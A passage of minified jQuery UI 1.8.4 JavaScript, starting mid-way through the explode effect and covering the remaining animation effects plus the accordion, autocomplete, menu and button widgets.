0;f<d;f++)b.clone().appendTo("body").wrap("<div></div>").css({position:"absolute",visibility:"visible",left:-f*(h/d),top:-e*(i/c)}).parent().addClass("ui-effects-explode").css({position:"absolute",overflow:"hidden",width:h/d,height:i/c,left:g.left+f*(h/d)+(a.options.mode=="show"?(f-Math.floor(d/2))*(h/d):0),top:g.top+e*(i/c)+(a.options.mode=="show"?(e-Math.floor(c/2))*(i/c):0),opacity:a.options.mode=="show"?0:1}).animate({left:g.left+f*(h/d)+(a.options.mode=="show"?0:(f-Math.floor(d/2))*(h/d)),top:g.top+
e*(i/c)+(a.options.mode=="show"?0:(e-Math.floor(c/2))*(i/c)),opacity:a.options.mode=="show"?1:0},a.duration||500);setTimeout(function(){a.options.mode=="show"?b.css({visibility:"visible"}):b.css({visibility:"visible"}).hide();a.callback&&a.callback.apply(b[0]);b.dequeue();j("div.ui-effects-explode").remove()},a.duration||500)})}})(jQuery);
(function(b){b.effects.fade=function(a){return this.queue(function(){var c=b(this),d=b.effects.setMode(c,a.options.mode||"hide");c.animate({opacity:d},{queue:false,duration:a.duration,easing:a.options.easing,complete:function(){a.callback&&a.callback.apply(this,arguments);c.dequeue()}})})}})(jQuery);
(function(c){c.effects.fold=function(a){return this.queue(function(){var b=c(this),j=["position","top","left"],d=c.effects.setMode(b,a.options.mode||"hide"),g=a.options.size||15,h=!!a.options.horizFirst,k=a.duration?a.duration/2:c.fx.speeds._default/2;c.effects.save(b,j);b.show();var e=c.effects.createWrapper(b).css({overflow:"hidden"}),f=d=="show"!=h,l=f?["width","height"]:["height","width"];f=f?[e.width(),e.height()]:[e.height(),e.width()];var i=/([0-9]+)%/.exec(g);if(i)g=parseInt(i[1],10)/100*
f[d=="hide"?0:1];if(d=="show")e.css(h?{height:0,width:g}:{height:g,width:0});h={};i={};h[l[0]]=d=="show"?f[0]:g;i[l[1]]=d=="show"?f[1]:0;e.animate(h,k,a.options.easing).animate(i,k,a.options.easing,function(){d=="hide"&&b.hide();c.effects.restore(b,j);c.effects.removeWrapper(b);a.callback&&a.callback.apply(b[0],arguments);b.dequeue()})})}})(jQuery);
(function(b){b.effects.highlight=function(c){return this.queue(function(){var a=b(this),e=["backgroundImage","backgroundColor","opacity"],d=b.effects.setMode(a,c.options.mode||"show"),f={backgroundColor:a.css("backgroundColor")};if(d=="hide")f.opacity=0;b.effects.save(a,e);a.show().css({backgroundImage:"none",backgroundColor:c.options.color||"#ffff99"}).animate(f,{queue:false,duration:c.duration,easing:c.options.easing,complete:function(){d=="hide"&&a.hide();b.effects.restore(a,e);d=="show"&&!b.support.opacity&&
this.style.removeAttribute("filter");c.callback&&c.callback.apply(this,arguments);a.dequeue()}})})}})(jQuery);
(function(d){d.effects.pulsate=function(a){return this.queue(function(){var b=d(this),c=d.effects.setMode(b,a.options.mode||"show");times=(a.options.times||5)*2-1;duration=a.duration?a.duration/2:d.fx.speeds._default/2;isVisible=b.is(":visible");animateTo=0;if(!isVisible){b.css("opacity",0).show();animateTo=1}if(c=="hide"&&isVisible||c=="show"&&!isVisible)times--;for(c=0;c<times;c++){b.animate({opacity:animateTo},duration,a.options.easing);animateTo=(animateTo+1)%2}b.animate({opacity:animateTo},duration,
a.options.easing,function(){animateTo==0&&b.hide();a.callback&&a.callback.apply(this,arguments)});b.queue("fx",function(){b.dequeue()}).dequeue()})}})(jQuery);
(function(c){c.effects.puff=function(b){return this.queue(function(){var a=c(this),e=c.effects.setMode(a,b.options.mode||"hide"),g=parseInt(b.options.percent,10)||150,h=g/100,i={height:a.height(),width:a.width()};c.extend(b.options,{fade:true,mode:e,percent:e=="hide"?g:100,from:e=="hide"?i:{height:i.height*h,width:i.width*h}});a.effect("scale",b.options,b.duration,b.callback);a.dequeue()})};c.effects.scale=function(b){return this.queue(function(){var a=c(this),e=c.extend(true,{},b.options),g=c.effects.setMode(a,
b.options.mode||"effect"),h=parseInt(b.options.percent,10)||(parseInt(b.options.percent,10)==0?0:g=="hide"?0:100),i=b.options.direction||"both",f=b.options.origin;if(g!="effect"){e.origin=f||["middle","center"];e.restore=true}f={height:a.height(),width:a.width()};a.from=b.options.from||(g=="show"?{height:0,width:0}:f);h={y:i!="horizontal"?h/100:1,x:i!="vertical"?h/100:1};a.to={height:f.height*h.y,width:f.width*h.x};if(b.options.fade){if(g=="show"){a.from.opacity=0;a.to.opacity=1}if(g=="hide"){a.from.opacity=
1;a.to.opacity=0}}e.from=a.from;e.to=a.to;e.mode=g;a.effect("size",e,b.duration,b.callback);a.dequeue()})};c.effects.size=function(b){return this.queue(function(){var a=c(this),e=["position","top","left","width","height","overflow","opacity"],g=["position","top","left","overflow","opacity"],h=["width","height","overflow"],i=["fontSize"],f=["borderTopWidth","borderBottomWidth","paddingTop","paddingBottom"],k=["borderLeftWidth","borderRightWidth","paddingLeft","paddingRight"],p=c.effects.setMode(a,
b.options.mode||"effect"),n=b.options.restore||false,m=b.options.scale||"both",l=b.options.origin,j={height:a.height(),width:a.width()};a.from=b.options.from||j;a.to=b.options.to||j;if(l){l=c.effects.getBaseline(l,j);a.from.top=(j.height-a.from.height)*l.y;a.from.left=(j.width-a.from.width)*l.x;a.to.top=(j.height-a.to.height)*l.y;a.to.left=(j.width-a.to.width)*l.x}var d={from:{y:a.from.height/j.height,x:a.from.width/j.width},to:{y:a.to.height/j.height,x:a.to.width/j.width}};if(m=="box"||m=="both"){if(d.from.y!=
d.to.y){e=e.concat(f);a.from=c.effects.setTransition(a,f,d.from.y,a.from);a.to=c.effects.setTransition(a,f,d.to.y,a.to)}if(d.from.x!=d.to.x){e=e.concat(k);a.from=c.effects.setTransition(a,k,d.from.x,a.from);a.to=c.effects.setTransition(a,k,d.to.x,a.to)}}if(m=="content"||m=="both")if(d.from.y!=d.to.y){e=e.concat(i);a.from=c.effects.setTransition(a,i,d.from.y,a.from);a.to=c.effects.setTransition(a,i,d.to.y,a.to)}c.effects.save(a,n?e:g);a.show();c.effects.createWrapper(a);a.css("overflow","hidden").css(a.from);
if(m=="content"||m=="both"){f=f.concat(["marginTop","marginBottom"]).concat(i);k=k.concat(["marginLeft","marginRight"]);h=e.concat(f).concat(k);a.find("*[width]").each(function(){child=c(this);n&&c.effects.save(child,h);var o={height:child.height(),width:child.width()};child.from={height:o.height*d.from.y,width:o.width*d.from.x};child.to={height:o.height*d.to.y,width:o.width*d.to.x};if(d.from.y!=d.to.y){child.from=c.effects.setTransition(child,f,d.from.y,child.from);child.to=c.effects.setTransition(child,
f,d.to.y,child.to)}if(d.from.x!=d.to.x){child.from=c.effects.setTransition(child,k,d.from.x,child.from);child.to=c.effects.setTransition(child,k,d.to.x,child.to)}child.css(child.from);child.animate(child.to,b.duration,b.options.easing,function(){n&&c.effects.restore(child,h)})})}a.animate(a.to,{queue:false,duration:b.duration,easing:b.options.easing,complete:function(){a.to.opacity===0&&a.css("opacity",a.from.opacity);p=="hide"&&a.hide();c.effects.restore(a,n?e:g);c.effects.removeWrapper(a);b.callback&&
b.callback.apply(this,arguments);a.dequeue()}})})}})(jQuery);
(function(d){d.effects.shake=function(a){return this.queue(function(){var b=d(this),j=["position","top","left"];d.effects.setMode(b,a.options.mode||"effect");var c=a.options.direction||"left",e=a.options.distance||20,l=a.options.times||3,f=a.duration||a.options.duration||140;d.effects.save(b,j);b.show();d.effects.createWrapper(b);var g=c=="up"||c=="down"?"top":"left",h=c=="up"||c=="left"?"pos":"neg";c={};var i={},k={};c[g]=(h=="pos"?"-=":"+=")+e;i[g]=(h=="pos"?"+=":"-=")+e*2;k[g]=(h=="pos"?"-=":"+=")+
e*2;b.animate(c,f,a.options.easing);for(e=1;e<l;e++)b.animate(i,f,a.options.easing).animate(k,f,a.options.easing);b.animate(i,f,a.options.easing).animate(c,f/2,a.options.easing,function(){d.effects.restore(b,j);d.effects.removeWrapper(b);a.callback&&a.callback.apply(this,arguments)});b.queue("fx",function(){b.dequeue()});b.dequeue()})}})(jQuery);
(function(c){c.effects.slide=function(d){return this.queue(function(){var a=c(this),h=["position","top","left"],e=c.effects.setMode(a,d.options.mode||"show"),b=d.options.direction||"left";c.effects.save(a,h);a.show();c.effects.createWrapper(a).css({overflow:"hidden"});var f=b=="up"||b=="down"?"top":"left";b=b=="up"||b=="left"?"pos":"neg";var g=d.options.distance||(f=="top"?a.outerHeight({margin:true}):a.outerWidth({margin:true}));if(e=="show")a.css(f,b=="pos"?-g:g);var i={};i[f]=(e=="show"?b=="pos"?
"+=":"-=":b=="pos"?"-=":"+=")+g;a.animate(i,{queue:false,duration:d.duration,easing:d.options.easing,complete:function(){e=="hide"&&a.hide();c.effects.restore(a,h);c.effects.removeWrapper(a);d.callback&&d.callback.apply(this,arguments);a.dequeue()}})})}})(jQuery);
(function(e){e.effects.transfer=function(a){return this.queue(function(){var b=e(this),c=e(a.options.to),d=c.offset();c={top:d.top,left:d.left,height:c.innerHeight(),width:c.innerWidth()};d=b.offset();var f=e('<div class="ui-effects-transfer"></div>').appendTo(document.body).addClass(a.options.className).css({top:d.top,left:d.left,height:b.innerHeight(),width:b.innerWidth(),position:"absolute"}).animate(c,a.duration,a.options.easing,function(){f.remove();a.callback&&a.callback.apply(b[0],arguments);
b.dequeue()})})}})(jQuery);
(function(c){c.widget("ui.accordion",{options:{active:0,animated:"slide",autoHeight:true,clearStyle:false,collapsible:false,event:"click",fillSpace:false,header:"> li > :first-child,> :not(li):even",icons:{header:"ui-icon-triangle-1-e",headerSelected:"ui-icon-triangle-1-s"},navigation:false,navigationFilter:function(){return this.href.toLowerCase()===location.href.toLowerCase()}},_create:function(){var a=this,b=a.options;a.running=0;a.element.addClass("ui-accordion ui-widget ui-helper-reset").children("li").addClass("ui-accordion-li-fix");
a.headers=a.element.find(b.header).addClass("ui-accordion-header ui-helper-reset ui-state-default ui-corner-all").bind("mouseenter.accordion",function(){b.disabled||c(this).addClass("ui-state-hover")}).bind("mouseleave.accordion",function(){b.disabled||c(this).removeClass("ui-state-hover")}).bind("focus.accordion",function(){b.disabled||c(this).addClass("ui-state-focus")}).bind("blur.accordion",function(){b.disabled||c(this).removeClass("ui-state-focus")});a.headers.next().addClass("ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom");
if(b.navigation){var d=a.element.find("a").filter(b.navigationFilter).eq(0);if(d.length){var f=d.closest(".ui-accordion-header");a.active=f.length?f:d.closest(".ui-accordion-content").prev()}}a.active=a._findActive(a.active||b.active).addClass("ui-state-default ui-state-active").toggleClass("ui-corner-all ui-corner-top");a.active.next().addClass("ui-accordion-content-active");a._createIcons();a.resize();a.element.attr("role","tablist");a.headers.attr("role","tab").bind("keydown.accordion",function(g){return a._keydown(g)}).next().attr("role",
"tabpanel");a.headers.not(a.active||"").attr({"aria-expanded":"false",tabIndex:-1}).next().hide();a.active.length?a.active.attr({"aria-expanded":"true",tabIndex:0}):a.headers.eq(0).attr("tabIndex",0);c.browser.safari||a.headers.find("a").attr("tabIndex",-1);b.event&&a.headers.bind(b.event.split(" ").join(".accordion ")+".accordion",function(g){a._clickHandler.call(a,g,this);g.preventDefault()})},_createIcons:function(){var a=this.options;if(a.icons){c("<span></span>").addClass("ui-icon "+a.icons.header).prependTo(this.headers);
this.active.children(".ui-icon").toggleClass(a.icons.header).toggleClass(a.icons.headerSelected);this.element.addClass("ui-accordion-icons")}},_destroyIcons:function(){this.headers.children(".ui-icon").remove();this.element.removeClass("ui-accordion-icons")},destroy:function(){var a=this.options;this.element.removeClass("ui-accordion ui-widget ui-helper-reset").removeAttr("role");this.headers.unbind(".accordion").removeClass("ui-accordion-header ui-accordion-disabled ui-helper-reset ui-state-default ui-corner-all ui-state-active ui-state-disabled ui-corner-top").removeAttr("role").removeAttr("aria-expanded").removeAttr("tabIndex");
this.headers.find("a").removeAttr("tabIndex");this._destroyIcons();var b=this.headers.next().css("display","").removeAttr("role").removeClass("ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content ui-accordion-content-active ui-accordion-disabled ui-state-disabled");if(a.autoHeight||a.fillHeight)b.css("height","");return c.Widget.prototype.destroy.call(this)},_setOption:function(a,b){c.Widget.prototype._setOption.apply(this,arguments);a=="active"&&this.activate(b);if(a=="icons"){this._destroyIcons();
b&&this._createIcons()}if(a=="disabled")this.headers.add(this.headers.next())[b?"addClass":"removeClass"]("ui-accordion-disabled ui-state-disabled")},_keydown:function(a){if(!(this.options.disabled||a.altKey||a.ctrlKey)){var b=c.ui.keyCode,d=this.headers.length,f=this.headers.index(a.target),g=false;switch(a.keyCode){case b.RIGHT:case b.DOWN:g=this.headers[(f+1)%d];break;case b.LEFT:case b.UP:g=this.headers[(f-1+d)%d];break;case b.SPACE:case b.ENTER:this._clickHandler({target:a.target},a.target);
a.preventDefault()}if(g){c(a.target).attr("tabIndex",-1);c(g).attr("tabIndex",0);g.focus();return false}return true}},resize:function(){var a=this.options,b;if(a.fillSpace){if(c.browser.msie){var d=this.element.parent().css("overflow");this.element.parent().css("overflow","hidden")}b=this.element.parent().height();c.browser.msie&&this.element.parent().css("overflow",d);this.headers.each(function(){b-=c(this).outerHeight(true)});this.headers.next().each(function(){c(this).height(Math.max(0,b-c(this).innerHeight()+
c(this).height()))}).css("overflow","auto")}else if(a.autoHeight){b=0;this.headers.next().each(function(){b=Math.max(b,c(this).height("").height())}).height(b)}return this},activate:function(a){this.options.active=a;a=this._findActive(a)[0];this._clickHandler({target:a},a);return this},_findActive:function(a){return a?typeof a==="number"?this.headers.filter(":eq("+a+")"):this.headers.not(this.headers.not(a)):a===false?c([]):this.headers.filter(":eq(0)")},_clickHandler:function(a,b){var d=this.options;
if(!d.disabled)if(a.target){a=c(a.currentTarget||b);b=a[0]===this.active[0];d.active=d.collapsible&&b?false:this.headers.index(a);if(!(this.running||!d.collapsible&&b)){this.active.removeClass("ui-state-active ui-corner-top").addClass("ui-state-default ui-corner-all").children(".ui-icon").removeClass(d.icons.headerSelected).addClass(d.icons.header);if(!b){a.removeClass("ui-state-default ui-corner-all").addClass("ui-state-active ui-corner-top").children(".ui-icon").removeClass(d.icons.header).addClass(d.icons.headerSelected);
a.next().addClass("ui-accordion-content-active")}h=a.next();f=this.active.next();g={options:d,newHeader:b&&d.collapsible?c([]):a,oldHeader:this.active,newContent:b&&d.collapsible?c([]):h,oldContent:f};d=this.headers.index(this.active[0])>this.headers.index(a[0]);this.active=b?c([]):a;this._toggle(h,f,g,b,d)}}else if(d.collapsible){this.active.removeClass("ui-state-active ui-corner-top").addClass("ui-state-default ui-corner-all").children(".ui-icon").removeClass(d.icons.headerSelected).addClass(d.icons.header);
this.active.next().addClass("ui-accordion-content-active");var f=this.active.next(),g={options:d,newHeader:c([]),oldHeader:d.active,newContent:c([]),oldContent:f},h=this.active=c([]);this._toggle(h,f,g)}},_toggle:function(a,b,d,f,g){var h=this,e=h.options;h.toShow=a;h.toHide=b;h.data=d;var j=function(){if(h)return h._completed.apply(h,arguments)};h._trigger("changestart",null,h.data);h.running=b.size()===0?a.size():b.size();if(e.animated){d={};d=e.collapsible&&f?{toShow:c([]),toHide:b,complete:j,
down:g,autoHeight:e.autoHeight||e.fillSpace}:{toShow:a,toHide:b,complete:j,down:g,autoHeight:e.autoHeight||e.fillSpace};if(!e.proxied)e.proxied=e.animated;if(!e.proxiedDuration)e.proxiedDuration=e.duration;e.animated=c.isFunction(e.proxied)?e.proxied(d):e.proxied;e.duration=c.isFunction(e.proxiedDuration)?e.proxiedDuration(d):e.proxiedDuration;f=c.ui.accordion.animations;var i=e.duration,k=e.animated;if(k&&!f[k]&&!c.easing[k])k="slide";f[k]||(f[k]=function(l){this.slide(l,{easing:k,duration:i||700})});
f[k](d)}else{if(e.collapsible&&f)a.toggle();else{b.hide();a.show()}j(true)}b.prev().attr({"aria-expanded":"false",tabIndex:-1}).blur();a.prev().attr({"aria-expanded":"true",tabIndex:0}).focus()},_completed:function(a){this.running=a?0:--this.running;if(!this.running){this.options.clearStyle&&this.toShow.add(this.toHide).css({height:"",overflow:""});this.toHide.removeClass("ui-accordion-content-active");this._trigger("change",null,this.data)}}});c.extend(c.ui.accordion,{version:"1.8.4",animations:{slide:function(a,
b){a=c.extend({easing:"swing",duration:300},a,b);if(a.toHide.size())if(a.toShow.size()){var d=a.toShow.css("overflow"),f=0,g={},h={},e;b=a.toShow;e=b[0].style.width;b.width(parseInt(b.parent().width(),10)-parseInt(b.css("paddingLeft"),10)-parseInt(b.css("paddingRight"),10)-(parseInt(b.css("borderLeftWidth"),10)||0)-(parseInt(b.css("borderRightWidth"),10)||0));c.each(["height","paddingTop","paddingBottom"],function(j,i){h[i]="hide";j=(""+c.css(a.toShow[0],i)).match(/^([\d+-.]+)(.*)$/);g[i]={value:j[1],
unit:j[2]||"px"}});a.toShow.css({height:0,overflow:"hidden"}).show();a.toHide.filter(":hidden").each(a.complete).end().filter(":visible").animate(h,{step:function(j,i){if(i.prop=="height")f=i.end-i.start===0?0:(i.now-i.start)/(i.end-i.start);a.toShow[0].style[i.prop]=f*g[i.prop].value+g[i.prop].unit},duration:a.duration,easing:a.easing,complete:function(){a.autoHeight||a.toShow.css("height","");a.toShow.css({width:e,overflow:d});a.complete()}})}else a.toHide.animate({height:"hide",paddingTop:"hide",
paddingBottom:"hide"},a);else a.toShow.animate({height:"show",paddingTop:"show",paddingBottom:"show"},a)},bounceslide:function(a){this.slide(a,{easing:a.down?"easeOutBounce":"swing",duration:a.down?1E3:200})}}})})(jQuery);
(function(e){e.widget("ui.autocomplete",{options:{appendTo:"body",delay:300,minLength:1,position:{my:"left top",at:"left bottom",collision:"none"},source:null},_create:function(){var a=this,b=this.element[0].ownerDocument;this.element.addClass("ui-autocomplete-input").attr("autocomplete","off").attr({role:"textbox","aria-autocomplete":"list","aria-haspopup":"true"}).bind("keydown.autocomplete",function(c){if(!a.options.disabled){var d=e.ui.keyCode;switch(c.keyCode){case d.PAGE_UP:a._move("previousPage",
c);break;case d.PAGE_DOWN:a._move("nextPage",c);break;case d.UP:a._move("previous",c);c.preventDefault();break;case d.DOWN:a._move("next",c);c.preventDefault();break;case d.ENTER:case d.NUMPAD_ENTER:a.menu.element.is(":visible")&&c.preventDefault();case d.TAB:if(!a.menu.active)return;a.menu.select(c);break;case d.ESCAPE:a.element.val(a.term);a.close(c);break;default:clearTimeout(a.searching);a.searching=setTimeout(function(){if(a.term!=a.element.val()){a.selectedItem=null;a.search(null,c)}},a.options.delay);
break}}}).bind("focus.autocomplete",function(){if(!a.options.disabled){a.selectedItem=null;a.previous=a.element.val()}}).bind("blur.autocomplete",function(c){if(!a.options.disabled){clearTimeout(a.searching);a.closing=setTimeout(function(){a.close(c);a._change(c)},150)}});this._initSource();this.response=function(){return a._response.apply(a,arguments)};this.menu=e("<ul></ul>").addClass("ui-autocomplete").appendTo(e(this.options.appendTo||"body",b)[0]).mousedown(function(c){var d=a.menu.element[0];
c.target===d&&setTimeout(function(){e(document).one("mousedown",function(f){f.target!==a.element[0]&&f.target!==d&&!e.ui.contains(d,f.target)&&a.close()})},1);setTimeout(function(){clearTimeout(a.closing)},13)}).menu({focus:function(c,d){d=d.item.data("item.autocomplete");false!==a._trigger("focus",null,{item:d})&&/^key/.test(c.originalEvent.type)&&a.element.val(d.value)},selected:function(c,d){d=d.item.data("item.autocomplete");var f=a.previous;if(a.element[0]!==b.activeElement){a.element.focus();
a.previous=f}false!==a._trigger("select",c,{item:d})&&a.element.val(d.value);a.close(c);a.selectedItem=d},blur:function(){a.menu.element.is(":visible")&&a.element.val()!==a.term&&a.element.val(a.term)}}).zIndex(this.element.zIndex()+1).css({top:0,left:0}).hide().data("menu");e.fn.bgiframe&&this.menu.element.bgiframe()},destroy:function(){this.element.removeClass("ui-autocomplete-input").removeAttr("autocomplete").removeAttr("role").removeAttr("aria-autocomplete").removeAttr("aria-haspopup");this.menu.element.remove();
e.Widget.prototype.destroy.call(this)},_setOption:function(a,b){e.Widget.prototype._setOption.apply(this,arguments);a==="source"&&this._initSource();if(a==="appendTo")this.menu.element.appendTo(e(b||"body",this.element[0].ownerDocument)[0])},_initSource:function(){var a,b;if(e.isArray(this.options.source)){a=this.options.source;this.source=function(c,d){d(e.ui.autocomplete.filter(a,c.term))}}else if(typeof this.options.source==="string"){b=this.options.source;this.source=function(c,d){e.getJSON(b,
c,d)}}else this.source=this.options.source},search:function(a,b){a=a!=null?a:this.element.val();if(a.length<this.options.minLength)return this.close(b);clearTimeout(this.closing);if(this._trigger("search")!==false)return this._search(a)},_search:function(a){this.term=this.element.addClass("ui-autocomplete-loading").val();this.source({term:a},this.response)},_response:function(a){if(a.length){a=this._normalize(a);this._suggest(a);this._trigger("open")}else this.close();this.element.removeClass("ui-autocomplete-loading")},
close:function(a){clearTimeout(this.closing);if(this.menu.element.is(":visible")){this._trigger("close",a);this.menu.element.hide();this.menu.deactivate()}},_change:function(a){this.previous!==this.element.val()&&this._trigger("change",a,{item:this.selectedItem})},_normalize:function(a){if(a.length&&a[0].label&&a[0].value)return a;return e.map(a,function(b){if(typeof b==="string")return{label:b,value:b};return e.extend({label:b.label||b.value,value:b.value||b.label},b)})},_suggest:function(a){var b=
this.menu.element.empty().zIndex(this.element.zIndex()+1),c;this._renderMenu(b,a);this.menu.deactivate();this.menu.refresh();this.menu.element.show().position(e.extend({of:this.element},this.options.position));a=b.width("").outerWidth();c=this.element.outerWidth();b.outerWidth(Math.max(a,c))},_renderMenu:function(a,b){var c=this;e.each(b,function(d,f){c._renderItem(a,f)})},_renderItem:function(a,b){return e("<li></li>").data("item.autocomplete",b).append(e("<a></a>").text(b.label)).appendTo(a)},_move:function(a,
b){if(this.menu.element.is(":visible"))if(this.menu.first()&&/^previous/.test(a)||this.menu.last()&&/^next/.test(a)){this.element.val(this.term);this.menu.deactivate()}else this.menu[a](b);else this.search(null,b)},widget:function(){return this.menu.element}});e.extend(e.ui.autocomplete,{escapeRegex:function(a){return a.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&")},filter:function(a,b){var c=new RegExp(e.ui.autocomplete.escapeRegex(b),"i");return e.grep(a,function(d){return c.test(d.label||d.value||
d)})}})})(jQuery);
(function(e){e.widget("ui.menu",{_create:function(){var a=this;this.element.addClass("ui-menu ui-widget ui-widget-content ui-corner-all").attr({role:"listbox","aria-activedescendant":"ui-active-menuitem"}).click(function(b){if(e(b.target).closest(".ui-menu-item a").length){b.preventDefault();a.select(b)}});this.refresh()},refresh:function(){var a=this;this.element.children("li:not(.ui-menu-item):has(a)").addClass("ui-menu-item").attr("role","menuitem").children("a").addClass("ui-corner-all").attr("tabindex",-1).mouseenter(function(b){a.activate(b,
e(this).parent())}).mouseleave(function(){a.deactivate()})},activate:function(a,b){this.deactivate();if(this.hasScroll()){var c=b.offset().top-this.element.offset().top,d=this.element.attr("scrollTop"),f=this.element.height();if(c<0)this.element.attr("scrollTop",d+c);else c>f&&this.element.attr("scrollTop",d+c-f+b.height())}this.active=b.eq(0).children("a").addClass("ui-state-hover").attr("id","ui-active-menuitem").end();this._trigger("focus",a,{item:b})},deactivate:function(){if(this.active){this.active.children("a").removeClass("ui-state-hover").removeAttr("id");
this._trigger("blur");this.active=null}},next:function(a){this.move("next",".ui-menu-item:first",a)},previous:function(a){this.move("prev",".ui-menu-item:last",a)},first:function(){return this.active&&!this.active.prevAll(".ui-menu-item").length},last:function(){return this.active&&!this.active.nextAll(".ui-menu-item").length},move:function(a,b,c){if(this.active){a=this.active[a+"All"](".ui-menu-item").eq(0);a.length?this.activate(c,a):this.activate(c,this.element.children(b))}else this.activate(c,
this.element.children(b))},nextPage:function(a){if(this.hasScroll())if(!this.active||this.last())this.activate(a,this.element.children(":first"));else{var b=this.active.offset().top,c=this.element.height(),d=this.element.children("li").filter(function(){var f=e(this).offset().top-b-c+e(this).height();return f<10&&f>-10});d.length||(d=this.element.children(":last"));this.activate(a,d)}else this.activate(a,this.element.children(!this.active||this.last()?":first":":last"))},previousPage:function(a){if(this.hasScroll())if(!this.active||
this.first())this.activate(a,this.element.children(":last"));else{var b=this.active.offset().top,c=this.element.height();result=this.element.children("li").filter(function(){var d=e(this).offset().top-b+c-e(this).height();return d<10&&d>-10});result.length||(result=this.element.children(":first"));this.activate(a,result)}else this.activate(a,this.element.children(!this.active||this.first()?":last":":first"))},hasScroll:function(){return this.element.height()<this.element.attr("scrollHeight")},select:function(a){this._trigger("selected",
a,{item:this.active})}})})(jQuery);
(function(a){var g,i=function(b){a(":ui-button",b.target.form).each(function(){var c=a(this).data("button");setTimeout(function(){c.refresh()},1)})},h=function(b){var c=b.name,d=b.form,e=a([]);if(c)e=d?a(d).find("[name='"+c+"']"):a("[name='"+c+"']",b.ownerDocument).filter(function(){return!this.form});return e};a.widget("ui.button",{options:{text:true,label:null,icons:{primary:null,secondary:null}},_create:function(){this.element.closest("form").unbind("reset.button").bind("reset.button",i);this._determineButtonType();
this.hasTitle=!!this.buttonElement.attr("title");var b=this,c=this.options,d=this.type==="checkbox"||this.type==="radio",e="ui-state-hover"+(!d?" ui-state-active":"");if(c.label===null)c.label=this.buttonElement.html();if(this.element.is(":disabled"))c.disabled=true;this.buttonElement.addClass("ui-button ui-widget ui-state-default ui-corner-all").attr("role","button").bind("mouseenter.button",function(){if(!c.disabled){a(this).addClass("ui-state-hover");this===g&&a(this).addClass("ui-state-active")}}).bind("mouseleave.button",
function(){c.disabled||a(this).removeClass(e)}).bind("focus.button",function(){a(this).addClass("ui-state-focus")}).bind("blur.button",function(){a(this).removeClass("ui-state-focus")});d&&this.element.bind("change.button",function(){b.refresh()});if(this.type==="checkbox")this.buttonElement.bind("click.button",function(){if(c.disabled)return false;a(this).toggleClass("ui-state-active");b.buttonElement.attr("aria-pressed",b.element[0].checked)});else if(this.type==="radio")this.buttonElement.bind("click.button",
function(){if(c.disabled)return false;a(this).addClass("ui-state-active");b.buttonElement.attr("aria-pressed",true);var f=b.element[0];h(f).not(f).map(function(){return a(this).button("widget")[0]}).removeClass("ui-state-active").attr("aria-pressed",false)});else{this.buttonElement.bind("mousedown.button",function(){if(c.disabled)return false;a(this).addClass("ui-state-active");g=this;a(document).one("mouseup",function(){g=null})}).bind("mouseup.button",function(){if(c.disabled)return false;a(this).removeClass("ui-state-active")}).bind("keydown.button",
function(f){if(c.disabled)return false;if(f.keyCode==a.ui.keyCode.SPACE||f.keyCode==a.ui.keyCode.ENTER)a(this).addClass("ui-state-active")}).bind("keyup.button",function(){a(this).removeClass("ui-state-active")});this.buttonElement.is("a")&&this.buttonElement.keyup(function(f){f.keyCode===a.ui.keyCode.SPACE&&a(this).click()})}this._setOption("disabled",c.disabled)},_determineButtonType:function(){this.type=this.element.is(":checkbox")?"checkbox":this.element.is(":radio")?"radio":this.element.is("input")?
"input":"button";if(this.type==="checkbox"||this.type==="radio"){this.buttonElement=this.element.parents().last().find("label[for="+this.element.attr("id")+"]");this.element.addClass("ui-helper-hidden-accessible");var b=this.element.is(":checked");b&&this.buttonElement.addClass("ui-state-active");this.buttonElement.attr("aria-pressed",b)}else this.buttonElement=this.element},widget:function(){return this.buttonElement},destroy:function(){this.element.removeClass("ui-helper-hidden-accessible");this.buttonElement.removeClass("ui-button ui-widget ui-state-default ui-corner-all ui-state-hover ui-state-active  ui-button-icons-only ui-button-icon-only ui-button-text-icons ui-button-text-icon-primary ui-button-text-icon-secondary ui-button-text-only").removeAttr("role").removeAttr("aria-pressed").html(this.buttonElement.find(".ui-button-text").html());
this.hasTitle||this.buttonElement.removeAttr("title");a.Widget.prototype.destroy.call(this)},_setOption:function(b,c){a.Widget.prototype._setOption.apply(this,arguments);if(b==="disabled")c?this.element.attr("disabled",true):this.element.removeAttr("disabled");this._resetButton()},refresh:function(){var b=this.element.is(":disabled");b!==this.options.disabled&&this._setOption("disabled",b);if(this.type==="radio")h(this.element[0]).each(function(){a(this).is(":checked")?a(this).button("widget").addClass("ui-state-active").attr("aria-pressed",
true):a(this).button("widget").removeClass("ui-state-active").attr("aria-pressed",false)});else if(this.type==="checkbox")this.element.is(":checked")?this.buttonElement.addClass("ui-state-active").attr("aria-pressed",true):this.buttonElement.removeClass("ui-state-active").attr("aria-pressed",false)},_resetButton:function(){if(this.type==="input")this.options.label&&this.element.val(this.options.label);else{var b=this.buttonElement.removeClass("ui-button-icons-only ui-button-icon-only ui-button-text-icons ui-button-text-icon-primary ui-button-text-icon-secondary ui-button-text-only"),
c=a("<span></span>").addClass("ui-button-text").html(this.options.label).appendTo(b.empty()).text(),d=this.options.icons,e=d.primary&&d.secondary;if(d.primary||d.secondary){b.addClass("ui-button-text-icon"+(e?"s":d.primary?"-primary":"-secondary"));d.primary&&b.prepend("<span class='ui-button-icon-primary ui-icon "+d.primary+"'></span>");d.secondary&&b.append("<span class='ui-button-icon-secondary ui-icon "+d.secondary+"'></span>");if(!this.options.text){b.addClass(e?"ui-button-icons-only":"ui-button-icon-only").removeClass("ui-button-text-icons ui-button-text-icon-primary ui-button-text-icon-secondary");
this.hasTitle||b.attr("title",c)}}else b.addClass("ui-button-text-only")}}});a.widget("ui.buttonset",{_create:function(){this.element.addClass("ui-buttonset");this._init()},_init:function(){this.refresh()},_setOption:function(b,c){b==="disabled"&&this.buttons.button("option",b,c);a.Widget.prototype._setOption.apply(this,arguments)},refresh:function(){this.buttons=this.element.find(":button, :submit, :reset, :checkbox, :radio, a, :data(button)").filter(":ui-button").button("refresh").end().not(":ui-button").button().end().map(function(){return a(this).button("widget")[0]}).removeClass("ui-corner-all ui-corner-left ui-corner-right").filter(":first").addClass("ui-corner-left").end().filter(":last").addClass("ui-corner-right").end().end()},
destroy:function(){this.element.removeClass("ui-buttonset");this.buttons.map(function(){return a(this).button("widget")[0]}).removeClass("ui-corner-left ui-corner-right").end().button("destroy");a.Widget.prototype.destroy.call(this)}})})(jQuery);
